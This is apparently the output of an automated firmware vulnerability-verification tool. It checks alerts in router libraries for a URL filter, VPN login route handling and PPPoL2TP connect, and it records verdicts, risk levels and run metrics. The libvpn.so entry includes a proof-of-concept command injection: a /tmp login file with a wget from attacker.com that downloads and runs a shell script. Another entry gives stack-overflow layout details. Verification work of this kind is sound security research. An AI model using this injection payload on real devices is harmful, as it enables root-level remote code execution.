  ```
- **备注：** The vulnerability requires the attacker to send a crafted network packet with a long URL that triggers the URL filter. The skb buffer management might mitigate some risks, but the lack of input sanitization in sprintf makes exploitation plausible. Further analysis is needed to determine exact buffer sizes and exploitation feasibility. Associated functions: sym.url_filter, sym.set_url_filter.

## 验证结论

- **描述准确性：** `inaccurate`
- **是否为真实漏洞：** `False`
- **风险级别：** `N/A`
- **详细原因：** 警报描述声称在sym.return_web_disable_page函数中，sprintf使用用户控制的URL数据，但反汇编代码显示：在0x08004f68的sprintf调用中，参数s3是get_lan_ip的返回值（本地IP），v0是strlen(s7)的结果，s7是固定HTML内容（从$LC2生成）。没有用户输入直接作为sprintf的参数。攻击者模型（未经身份验证的远程攻击者）无法控制这些参数，因此输入不可控，路径不可达。缓冲区s2可能有限，但由于数据是内部生成的，溢出仅可能由内部错误引起，而非攻击者利用。因此，漏洞不存在。

## 验证指标

- **验证时长：** 312.75 秒
- **Token 使用量：** 319662

---

## 原始信息

- **文件/目录路径：** `lib/libvpn.so`
- **位置：** `libvpn.so:0x000031e4 sym.vpnUsrLoginAddRoute`
- **描述：** The function 'sym.vpnUsrLoginAddRoute' in 'libvpn.so' contains a stack buffer overflow and command injection vulnerability due to improper handling of input from login files. The function reads data from files in '/tmp/pptp/logininfo%d' or '/tmp/l2tp/logininfo%d' using sscanf with the format "%[^;];%[^;];%[^;];%[^;];%s", writing string data to fixed-size buffers, including a 4-byte uint variable (&uStack_84), causing stack overflow. The overflowed data is then used in system commands executed via 'doSystemCmd', such as 'ip rule add' and 'ip route add', without sanitization, allowing command injection if input contains shell metacharacters. An attacker with valid login credentials can exploit this by creating a malicious login file in the world-writable /tmp directory and triggering the VPN login process, leading to arbitrary command execution as the process user (likely root or a privileged user).
- **代码片段：**
  ```
  iVar1 = (**(iStack_1a8 + -0x7f5c)) (auStack_140,"%[^;];%[^;];%[^;];%[^;];%s" + *(iStack_1a8 + -0x7fe0),auStack_c0,&uStack_84, acStack_180,auStack_ac,auStack_98);
  ...
  (**(iStack_1a8 + -0x7f4c)) ("ip rule add to %s table wan%d prio %d" + *(iStack_1a8 + -0x7fe0),&uStack_84, uStackX_4, "t mangle %s POSTROUTING -o %s -j TCPMSS -p tcp --syn \t\t\t--set-mss %d");
  ```
- **备注：** The vulnerability requires the function to be called with a user-controlled parameter for the login file index. Cross-references show this function is called from other VPN-related processes, likely during user authentication. Further analysis should verify the caller context and test exploitability with specific input. The use of 'doSystemCmd' with unsanitized input is a common pattern in other functions like 'sym.set_vpn_nat', suggesting broader issues.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了漏洞。反汇编代码显示：1) 在地址0x000033f4，sscanf使用格式字符串"%[^;];%[^;];%[^;];%[^;];%s"读取文件数据，写入固定栈缓冲区（如fp+0x48、fp+0x108、fp+0x144等），无宽度限制，可导致栈缓冲区溢出（例如，若输入字符串超过目标缓冲区大小）。2) 在多个位置（如0x0000381c、0x000038b4、0x0000391c），doSystemCmd直接使用用户输入执行系统命令，未 sanitize 输入，允许命令注入（如输入包含分号或反引号可注入任意命令）。攻击者模型：攻击者可通过全局可写/tmp目录创建恶意文件（如/tmp/pptp/logininfo0），内容包含恶意载荷，并触发VPN登录过程（例如通过网络请求）；进程可能以root权限运行，导致特权升级。PoC步骤：1) 创建文件/tmp/pptp/logininfo0，内容为"valid;`wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh`;data;more;fields"。2) 触发VPN登录（如发送认证请求），导致命令执行。漏洞链完整：输入可控（文件内容）、路径可达（函数被VPN进程调用）、实际影响（root权限命令执行）。

## 验证指标

- **验证时长：** 308.94 秒
- **Token 使用量：** 275817

---

## 原始信息

- **文件/目录路径：** `lib/pppol2tp.so`
- **位置：** `pppol2tp.so:0x1a78 connect_pppol2tp`
- **描述：** 在 'connect_pppol2tp' 函数中，局部缓冲区 'auStack_34'（大小为18字节）被传递给一个函数调用，该调用使用 'uStack_38'（设置为38字节）作为长度参数，导致栈缓冲区溢出。触发条件：攻击者通过PPPoL2TP套接字发送超过18字节的恶意数据。边界检查缺失：函数未验证输入长度是否适配缓冲区大小。潜在利用方式：溢出可覆盖返回地址或关键栈数据，允许攻击者执行任意代码。攻击链完整：攻击者作为已认证用户可访问套接字，发送恶意数据触发溢出，实现权限提升或代码执行。
- **代码片段：**
  ```
  uint dbg.connect_pppol2tp(void)
  {
      ...
      uchar auStack_34 [18];
      uStack_38 = 0x26;
      ...
      (**(iStack_40 + -0x7fd0))(uVar4,auStack_34,&uStack_38); // Buffer overflow: 38 bytes written to 18-byte buffer
      ...
  }
  ```
- **备注：** 漏洞需要攻击者能访问PPPoL2TP套接字，可能通过网络服务或IPC实现。建议进一步验证套接字初始化逻辑和全局变量来源。关联函数：disconnect_pppol2tp。后续分析方向：检查调用此函数的组件（如pppd守护进程）以确认输入源和利用可行性。

## 验证结论

- **描述准确性：** `partially`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** 验证结果：警报部分准确。反编译证据确认了栈缓冲区溢出：在connect_pppol2tp函数中，18字节缓冲区auStack_34被传递给getsockname调用，同时uStack_38设置为38字节，导致溢出。栈布局分析显示缓冲区从sp+0x1c开始，溢出到sp+0x42，而返回地址在sp+0x4c，因此直接覆盖返回地址不可行（有10字节间隙），但会覆盖其他栈变量如auStack_22（从sp+0x2e开始），可能引发崩溃或数据损坏。攻击者模型：已认证用户可通过网络服务或IPC访问PPPoL2TP套接字，发送超过18字节的恶意数据触发溢出。漏洞可利用性：输入可控（攻击者影响套接字数据），路径可达（函数在pppol2tp_fd有效时执行），但实际影响限于拒绝服务或潜在信息泄露，而非直接代码执行。PoC步骤：攻击者作为已认证用户建立PPPoL2TP连接并发送精心构造的超过18字节的数据包，触发getsockname写入溢出，导致程序异常。

## 验证指标

- **验证时长：** 397.00 秒
- **Token 使用量：** 263410

---

